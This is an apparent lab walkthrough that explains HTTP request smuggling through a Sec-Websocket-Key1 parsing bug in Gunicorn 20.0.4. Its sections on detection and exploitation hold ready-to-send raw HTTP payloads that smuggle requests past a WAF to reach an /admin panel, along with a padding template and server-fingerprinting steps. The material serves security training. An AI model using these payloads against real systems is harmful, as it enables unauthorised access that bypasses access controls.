# 🐛 Vulnerable Software - Request Smuggling via Software Bugs

## Overview

Request smuggling doesn't only arise from CL/TE parsing differences. **Software-specific bugs** can also cause incorrect request length parsing, leading to desynchronization.

This section covers vulnerabilities in specific software implementations that enable request smuggling attacks.

---

## Gunicorn 20.0.4 - Sec-Websocket-Key1 Bug

### Vulnerability Details

| Property | Value |
|----------|-------|
| **Software** | Gunicorn (Python WSGI HTTP Server) |
| **Affected Version** | 20.0.4 |
| **Bug** | `Sec-Websocket-Key1` header truncates body to 8 bytes |
| **Impact** | Request smuggling, WAF bypass |

### The Bug

When Gunicorn 20.0.4 encounters the `Sec-Websocket-Key1` HTTP header:
- It **ignores** the `Content-Length` header
- It **ignores** the `Transfer-Encoding` header
- It **forces** request body length to **exactly 8 bytes**

This is a legacy WebSocket handshake header that triggers buggy behavior.

### Why It's Exploitable

```
Reverse Proxy: Uses CL header → parses full body
Gunicorn:      Sees Sec-Websocket-Key1 → forces 8-byte body
```

This creates desynchronization even when both systems "support" proper header parsing.

---

## Identification

### Detection Request

**Request 1** (Smuggling):

```http
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

xxxxxxxxGET /404 HTTP/1.1
Host: gunicorn.htb

```

> **Note**: `xxxxxxxx` = exactly 8 characters (padding for Gunicorn's forced body length)

**Request 2** (Probe):

```http
GET / HTTP/1.1
Host: gunicorn.htb
```

### Testing Procedure

1. Create tab group in Burp Repeater
2. Send both requests via single connection
3. Observe responses

### Expected Results

| Request | Expected Path | Actual Response |
|---------|---------------|-----------------|
| Request 1 | GET / | 200 OK (index page) |
| Request 2 | GET / | **404 Not Found** ← Smuggled! |

If Request 2 returns 404 instead of 200, the smuggled `/404` request was processed.

---

## TCP Stream Analysis

### Reverse Proxy View

```http
[Request 1]
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

Body (49 bytes): "xxxxxxxxGET /404 HTTP/1.1\r\nHost: gunicorn.htb\r\n\r\n"

[Request 2]
GET / HTTP/1.1
Host: gunicorn.htb
```

**Proxy sees**: Two GET requests to `/`

### Gunicorn View (Buggy)

```http
[Request 1]
GET / HTTP/1.1
Host: gunicorn.htb
Content-Length: 49
Sec-Websocket-Key1: x

Body (8 bytes only!): "xxxxxxxx"

[Request 2 - SMUGGLED]
GET /404 HTTP/1.1
Host: gunicorn.htb

[Request 3]
GET / HTTP/1.1
Host: gunicorn.htb
```

**Gunicorn sees**: Three requests - including smuggled `/404`!

---

## Exploitation - WAF Bypass

### Scenario

- WAF blocks requests with `admin` in URL
- Goal: Access `/admin` panel

### Exploit Requests

**Request 1** (Smuggling):

```http
GET / HTTP/1.1
Host: <TARGET>
Content-Length: 59
Sec-Websocket-Key1: x

xxxxxxxxGET /admin HTTP/1.1
Host: <TARGET>

```

**Request 2** (Trigger):

```http
GET / HTTP/1.1
Host: <TARGET>
```

### Content-Length Calculation

```
xxxxxxxx                           = 8 bytes
GET /admin HTTP/1.1\r\n            = 22 bytes
Host: <TARGET>\r\n                 = ~20 bytes (varies)
\r\n                               = 2 bytes
                                   ──────────
                                   ~52-60 bytes
```

Adjust CL to match your target hostname.

---

## Attack Flow

```
┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
│   Attacker  │                  │  WAF/Proxy  │                  │  Gunicorn   │
└──────┬──────┘                  └──────┬──────┘                  └──────┬──────┘
       │                                │                                │
       │ GET / HTTP/1.1                 │                                │
       │ CL: 59                         │                                │
       │ Sec-Websocket-Key1: x          │                                │
       │ Body: xxxxxxxxGET /admin...    │                                │
       │───────────────────────────────>│                                │
       │                                │                                │
       │                                │ Uses CL: 59                    │
       │                                │ Full body parsed               │
       │                                │ Sees: GET /                    │
       │                                │ No /admin in URL → ALLOW       │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Sec-Websocket-Key1
       │                                │                                │ triggers bug!
       │                                │                                │ Body forced to 8 bytes
       │                                │                                │ "xxxxxxxx" only
       │                                │                                │
       │                                │                                │ Leftover:
       │                                │                                │ "GET /admin..."
       │                                │                                │
       │ GET / HTTP/1.1                 │                                │
       │───────────────────────────────>│                                │
       │                                │ Sees: GET / → ALLOW            │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Processes smuggled
       │                                │                                │ GET /admin first!
       │                                │                                │
       │<───────────────────────────────│<───────────────────────────────│
       │     Response: Admin Panel!     │                                │
```

---

## Server Detection

### Identifying Gunicorn

Check response headers:

```http
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
```

### Version Check

The vulnerability affects **Gunicorn 20.0.4** specifically.

```bash
# From response headers
Server: gunicorn/20.0.4  ← Vulnerable!
Server: gunicorn/20.1.0  ← Likely patched
```

---

## The 8-Byte Padding

### Why `xxxxxxxx`?

The `Sec-Websocket-Key1` bug forces exactly 8 bytes for the body:

```
xxxxxxxx = 8 characters = 8 bytes
```

You can use any 8 characters:
- `xxxxxxxx`
- `AAAAAAAA`
- `12345678`
- `        ` (8 spaces)

### Calculation Template

```
[8 bytes padding][Smuggled Request]
        ↓               ↓
   xxxxxxxx      GET /admin HTTP/1.1...
```

---

## Other Vulnerable Software

### Known Request Smuggling CVEs

| Software | CVE | Description |
|----------|-----|-------------|
| **Gunicorn 20.0.4** | - | Sec-Websocket-Key1 bug |
| **HAProxy** | CVE-2021-40346 | Integer overflow in content-length |
| **Apache** | CVE-2022-22720 | Request splitting |
| **Node.js** | CVE-2022-32215 | HTTP Request Smuggling |
| **Nginx** | Various | Chunked encoding edge cases |

### Research Resources

- [Gunicorn Bug Post](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/)
- [PortSwigger Research](https://portswigger.net/research/http-desync-attacks)
- [HTTP Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

---

## Tips & Tricks

### Testing Multiple Versions

When targeting unknown infrastructure:
1. Identify server software from headers
2. Research known smuggling bugs
3. Test version-specific payloads

### Burp Configuration

Same as TE.CL:
1. Disable "Update Content-Length"
2. Create tab group
3. Send in sequence (single connection)

### Fallback Strategy

If CL/TE techniques fail:
- Check for software-specific bugs
- Test unusual headers
- Research CVEs for identified software

---

## Lab Walkthrough Summary

1. **Identify** server: `Server: gunicorn/20.0.4`
2. **Confirm** WAF blocks `/admin`
3. **Test** Sec-Websocket-Key1 bug with `/404` smuggle
4. **Verify** Request 2 returns 404 (smuggled request processed)
5. **Exploit** by smuggling `GET /admin` instead
6. **Access** admin panel via Response 2

---

## References

- [Gunicorn 20.0.4 Request Smuggling](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/)
- [HTTP Desync Attacks - James Kettle](https://portswigger.net/research/http-desync-attacks)
- [CVE Database - Request Smuggling](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=request+smuggling)

